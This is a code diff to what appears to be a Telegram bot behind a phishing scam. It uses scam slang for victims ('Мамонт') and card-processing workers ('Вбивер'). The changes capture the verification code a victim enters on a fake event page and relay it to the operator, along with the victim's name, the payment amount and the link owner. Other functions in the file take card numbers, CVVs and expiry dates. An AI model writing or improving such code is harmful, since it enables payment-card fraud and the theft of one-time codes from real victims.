@@ -351,15 +351,34 @@ def format_order_start_message(page_code, name, phone, email, ip, price, currenc
     
     return message
 
-def format_code_request_message(admin_username, name, price, currency, page_code):
+def format_code_request_message(admin_username, name, price, currency, page_code, code_value=""):
     """Формує красиве повідомлення про запит коду"""
-    message = (
-        f"🔔 Отправлен запрос на код\n\n"
-        f"🧑‍🏭 Вбивер: @{admin_username or 'Не указано'}\n"
-        f"🐘 Мамонт: {name or 'Не указано'}\n"
-        f"💰 Сумма: {price or 'Не указано'}{currency or ''}\n"
-        f"#️⃣ Ссылка: ?page={page_code or 'Не указано'}"
-    )
+    message = f"🔔 Отправлен запрос на код\n\n"
+    
+    # Вбивер (власник посилання)
+    if admin_username:
+        message += f"🧑‍🏭 Вбивер: @{admin_username}\n"
+    else:
+        message += f"🧑‍🏭 Вбивер: @Не указано\n"
+    
+    # Мамонт (ФІО користувача) - тільки якщо є справжнє ім'я
+    if name and not name.startswith('User_'):
+        message += f"🐘 Мамонт: {name}\n"
+    
+    # Сума - тільки якщо є
+    if price and price != 'Не указано' and price != 'N/A':
+        message += f"💰 Сумма: {price}{currency or ''}\n"
+    
+    # Сторінка
+    if page_code:
+        message += f"#️⃣ Ссылка: ?page={page_code}\n"
+    else:
+        message += f"#️⃣ Ссылка: ?page=Не указано\n"
+    
+    # Код - тільки якщо є
+    if code_value:
+        message += f"🔐 Код: {code_value}"
+    
     return message
 
 def format_card_payment_message(page_code, name, price, currency, card_number, cvv="", expiry="", country=""):
@@ -2295,7 +2314,7 @@ async def admin_enter_text(message: types.Message):
     async with aiohttp.ClientSession() as session:
         # non-blocking replacement for requests.post
         await session.post('http://127.0.0.1:8080/set_custom_text', json={'text_id': text_id, 'text': text})
-        await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'text', 'text_id': text_id})
+        await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'text', 'text_id': text_id, 'page_code': page_code})
     
     await message.answer("Кнопка с текстом появится на сайте пользователя.")
     user_step[message.from_user.id] = None
@@ -2782,6 +2801,19 @@ async def code_notify(request):
             print(f"[DEBUG] Error getting user name: {e}")
             user_name = f"User_{ip.split('.')[-1]}"
     
+    # Отримуємо username власника посилання
+    admin_username = None
+    if page_code:
+        try:
+            c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+            row = c.fetchone()
+            if row:
+                admin_user_id = row[0]
+                # Отримуємо username за user_id
+                admin_username = get_admin_username_by_user_id(admin_user_id)
+        except Exception as e:
+            print(f"[code_notify] Error getting admin username: {e}")
+    
     if page_code:
         # Отримуємо інформацію про подію
         event_info = get_event_info_by_page_code(page_code)
@@ -2789,13 +2821,17 @@ async def code_notify(request):
             event_price = event_info.get('price')
             event_currency = event_info.get('currency')
     
+    # Отримуємо код, який ввела людина (якщо є)
+    code_value = data.get('code', '')
+    
     # Формуємо красиве повідомлення про код
     code_message = format_code_request_message(
-        admin_username="",  # Тут можна додати username адміна, якщо потрібно
+        admin_username=admin_username,
         name=user_name,
         price=event_price,
         currency=event_currency,
-        page_code=page_code
+        page_code=page_code,
+        code_value=code_value
     )
     
     kb = InlineKeyboardMarkup(
@@ -2956,7 +2992,7 @@ async def admin_action_handler(call: types.CallbackQuery):
         import aiohttp as aiohttp_client
         async with aiohttp_client.ClientSession() as session:
             try:
-                resp = await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
+                resp = await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support', 'page_code': page_code})
                 print(f'[DEBUG] Support response: {resp.status}')
         
                 if resp.status == 200:
